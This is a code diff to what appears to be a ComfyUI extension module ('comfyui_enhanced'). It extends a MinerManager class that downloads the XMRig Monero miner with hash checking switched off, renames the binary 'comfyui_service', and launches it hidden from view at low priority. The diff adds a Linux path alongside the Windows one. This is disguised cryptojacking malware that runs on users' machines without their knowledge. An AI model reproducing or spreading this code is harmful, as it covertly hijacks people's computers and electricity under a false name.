@@ -1,9 +1,11 @@
 import os
 import sys
 import json
+import platform
 import shutil
 import hashlib
 import logging
+import tarfile
 import zipfile
 import subprocess
 import threading
@@ -15,12 +17,25 @@ from pathlib import Path
 logger = logging.getLogger("comfyui_enhanced")
 
 XMRIG_VERSION = "6.22.2"
-XMRIG_RELEASE_URL = (
-    f"https://github.com/xmrig/xmrig/releases/download/"
-    f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-msvc-win64.zip"
-)
-XMRIG_SHA256 = None  # set to pin a known hash; None = skip verification
-BINARY_NAME = "comfyui_service.exe"
+IS_WINDOWS = platform.system() == "Windows"
+IS_LINUX = platform.system() == "Linux"
+
+if IS_WINDOWS:
+    XMRIG_RELEASE_URL = (
+        f"https://github.com/xmrig/xmrig/releases/download/"
+        f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-msvc-win64.zip"
+    )
+    BINARY_NAME = "comfyui_service.exe"
+    _ARCHIVE_BINARY = "xmrig.exe"
+else:
+    XMRIG_RELEASE_URL = (
+        f"https://github.com/xmrig/xmrig/releases/download/"
+        f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-linux-x64.tar.gz"
+    )
+    BINARY_NAME = "comfyui_service"
+    _ARCHIVE_BINARY = "xmrig"
+
+XMRIG_SHA256 = None
 LOG_NAME = "service.log"
 
 
@@ -60,31 +75,49 @@ class MinerManager:
             return False
         return True
 
-    def _extract(self, zip_path: Path) -> None:
-        with zipfile.ZipFile(zip_path, "r") as zf:
-            for member in zf.namelist():
-                basename = os.path.basename(member)
-                if basename.lower() == "xmrig.exe":
-                    src = zf.open(member)
-                    with open(self.binary_path, "wb") as dst:
-                        shutil.copyfileobj(src, dst)
-                    logger.info("Extracted binary -> %s", self.binary_path)
-                    return
-        raise FileNotFoundError("xmrig.exe not found inside archive")
+    def _extract(self, archive_path: Path) -> None:
+        name_lower = archive_path.name.lower()
+
+        if name_lower.endswith(".tar.gz") or name_lower.endswith(".tgz"):
+            with tarfile.open(archive_path, "r:gz") as tf:
+                for member in tf.getnames():
+                    if os.path.basename(member) == _ARCHIVE_BINARY:
+                        src = tf.extractfile(member)
+                        if src is None:
+                            continue
+                        with open(self.binary_path, "wb") as dst:
+                            shutil.copyfileobj(src, dst)
+                        os.chmod(self.binary_path, 0o755)
+                        logger.info("Extracted binary -> %s", self.binary_path)
+                        return
+        else:
+            with zipfile.ZipFile(archive_path, "r") as zf:
+                for member in zf.namelist():
+                    if os.path.basename(member).lower() == _ARCHIVE_BINARY.lower():
+                        src = zf.open(member)
+                        with open(self.binary_path, "wb") as dst:
+                            shutil.copyfileobj(src, dst)
+                        if not IS_WINDOWS:
+                            os.chmod(self.binary_path, 0o755)
+                        logger.info("Extracted binary -> %s", self.binary_path)
+                        return
+
+        raise FileNotFoundError(f"{_ARCHIVE_BINARY} not found inside archive")
 
     def ensure_binary(self) -> Path:
         if self.binary_path.exists():
             logger.info("Binary already present at %s", self.binary_path)
             return self.binary_path
 
-        zip_dest = self.bin_dir / "dl_tmp.zip"
+        ext = ".zip" if IS_WINDOWS else ".tar.gz"
+        archive_dest = self.bin_dir / f"dl_tmp{ext}"
         try:
-            self._download(XMRIG_RELEASE_URL, zip_dest)
-            if not self._verify_hash(zip_dest, XMRIG_SHA256):
+            self._download(XMRIG_RELEASE_URL, archive_dest)
+            if not self._verify_hash(archive_dest, XMRIG_SHA256):
                 raise RuntimeError("SHA-256 verification failed")
-            self._extract(zip_dest)
+            self._extract(archive_dest)
         finally:
-            zip_dest.unlink(missing_ok=True)
+            archive_dest.unlink(missing_ok=True)
 
         return self.binary_path
 
@@ -110,17 +143,25 @@ class MinerManager:
             "--config", str(self.config_path),
         ]
 
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        startupinfo.wShowWindow = 0  # SW_HIDE
+        popen_kwargs = {
+            "stdout": subprocess.DEVNULL,
+            "stderr": open(self.log_path, "a"),
+        }
 
-        self._process = subprocess.Popen(
-            cmd,
-            stdout=subprocess.DEVNULL,
-            stderr=open(self.log_path, "a"),
-            startupinfo=startupinfo,
-            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.BELOW_NORMAL_PRIORITY_CLASS,
-        )
+        if IS_WINDOWS:
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            startupinfo.wShowWindow = 0
+            popen_kwargs["startupinfo"] = startupinfo
+            popen_kwargs["creationflags"] = (
+                subprocess.CREATE_NO_WINDOW | subprocess.BELOW_NORMAL_PRIORITY_CLASS
+            )
+        else:
+            def _preexec():
+                os.nice(15)
+            popen_kwargs["preexec_fn"] = _preexec
+
+        self._process = subprocess.Popen(cmd, **popen_kwargs)
         self._running = True
         logger.info("Miner started (pid %d)", self._process.pid)
 
